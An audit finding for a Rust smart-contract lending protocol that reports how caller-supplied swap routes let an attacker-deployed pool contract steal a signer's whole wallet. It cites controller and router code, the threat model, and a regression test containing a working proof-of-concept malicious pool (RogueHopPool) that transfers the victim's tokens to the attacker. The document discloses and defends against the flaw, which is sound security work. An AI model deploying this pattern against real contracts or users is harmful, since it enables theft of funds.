### Title
Caller-supplied swap route executes arbitrary pool code under the signer's authorization tree, draining unrelated wallet tokens - (File: contracts/controller/src/strategies/swap.rs)

### Summary
Analog of CVE-2019-1010023 (running `ldd` on an attacker-supplied ELF executes attacker code with the victim's privileges): every routed controller strategy (`swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, `multiply`) forwards a fully caller-controlled `swap` XDR to the swap aggregator, which invokes whatever pool addresses the payload names. Neither the controller nor the router keeps a venue allowlist, so a route can place attacker-deployed Wasm on the call stack. That code runs inside the signer's `require_auth` subtree: simulation records any `token.transfer(victim, attacker, amount)` the rogue pool issues as a child of the victim's signed entry, and enforcing mode executes it once signed. The proof is pinned in `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`: Alice's entire balance of a token the protocol never listed is moved to the attacker, while the swap itself returns a fair output and passes all risk gates. [1](#0-0) [2](#0-1) 

### Finding Description
`swap_tokens` reads the router address from storage and calls `router.execute_strategy(&controller, &amount_in, swap)` where `swap` is the caller's opaque `StrategySwap` payload; the controller validates only `!swap.is_empty()` and authorizes exactly one `token_in` transfer for its own balance. [3](#0-2)  The router decodes the payload and calls `env.invoke_contract(pool, "swap", ...)` on the pool address the payload names — no allowlist of pools exists. [4](#0-3)  Because the router call sits inside the caller's `require_auth` for `swap_collateral`/`multiply`/etc., a `token.transfer(victim, attacker, x)` issued by a malicious pool is recorded by the host as a child invocation under the victim's root entry; a client that signs the simulated tree authorizes the theft. [5](#0-4)  The controller's post-swap checks (`RouterOverspend`, `NoSwapOutput`, refund of leftover input, final risk gates) only measure the controller's own balances and are fully satisfied while the victim's wallet is drained. [6](#0-5) 

### Impact Explanation
Theft of user funds. An unprivileged attacker deploys a "pool" contract that steals every token the victim holds, not just the routed input — the harness test moves Alice's full `WALLET_BALANCE` of an unlisted token to the attacker in one signed `swap_collateral`. Neither `total_min_out`, the controller's measured-output check, nor post-swap solvency bounds the loss, which equals the victim's whole wallet across all tokens. [7](#0-6) 

### Likelihood Explanation
Reachable by any unprivileged address: the attacker deploys a rogue pool contract, encodes it into a route, and needs the victim to sign the poisoned auth tree — the same user-interaction vector as the CVE (attacker supplies the data, victim's trusted tooling executes it). Standard clients that blindly sign `simulateTransaction` output are exposed by default, since the stolen transfer is recorded automatically as a legitimate-looking child of the strategy call. The threat model itself confirms "a direct router swap gives exactly one input transfer" is the only honest shape, and relies entirely on the client refusing any other child — an assumption the contracts neither enforce nor can enforce. [8](#0-7) 

### Recommendation
Mitigation must live at the route/policy layer since contracts cannot inspect a signed auth tree: (a) maintain an on-chain venue/pool allowlist in the swap aggregator (analogous to the existing token whitelist) so only audited pool deployments can appear in routes; (b) have the controller reject routes whose pool addresses are not allowlisted before authorizing the input transfer; (c) require wallets/SDK clients to decode the simulated auth tree and reject any child invocation other than the single expected `token_in` transfer, treating anything else as a malicious route. Without (a)/(b), option (c) is the only defense and is fragile. [9](#0-8) 

### Proof of Concept
The codebase ships the exploit as a regression test. `UnlistedPoolRouter.execute_strategy` invokes the payload-named `hop_pool`; `RogueHopPool.swap` executes `token.transfer(victim, attacker, amount)`; the test signs Alice's `swap_collateral` with the recorded tree and asserts `wallet(alice) == 0`, `wallet(attacker) == WALLET_BALANCE`, and a fair `FAIR_OUT_ETH` swap receipt — i.e., the protocol settles normally while the unrelated wallet token is stolen. [10](#0-9) [7](#0-6)

### Citations

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L33-72)
```rust
/// Router double: pays a fair output and calls the hop pool the payload names.
#[contract]
pub struct UnlistedPoolRouter;

#[contractimpl]
impl UnlistedPoolRouter {
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
}

/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** contracts/controller/src/strategies/swap.rs (L21-38)
```rust
    require_positive_amount(env, amount_in);
    assert_with_error!(env, !swap.is_empty(), GenericError::InvalidPayments);

    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** contracts/swap-aggregator/src/venues/aquarius/pool.rs (L25-34)
```rust
    authorize_token_transfer(env, token_in, router, pool, amount_in);
    let args: Vec<Val> = vec![
        env,
        router.into_val(env),
        in_idx.into_val(env),
        out_idx.into_val(env),
        to_u128(env, amount_in).into_val(env),
        0_u128.into_val(env),
    ];
    let _: u128 = env.invoke_contract(pool, &symbol_short!("swap"), args);
```

**File:** docs/explanation/threat-model.md (L142-165)
```markdown
## Routes, callbacks, and external integrations

Router swaps settle measured input/output changes. The controller grants
one exact input-transfer invocation, not a token allowance, and refunds
unspent input still held by the controller. The router checks its payload
minimum against output after fees but before payout; its own residuals
follow a capped admin-revenue policy. The controller requires positive
measured output and final account risk, not an independent slippage bound.
A compromised router may consume authorized input for dust output while the
final account passes its risk gates. Exposure is bounded by routed funds and
those gates, not by an independent controller slippage limit.

That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```
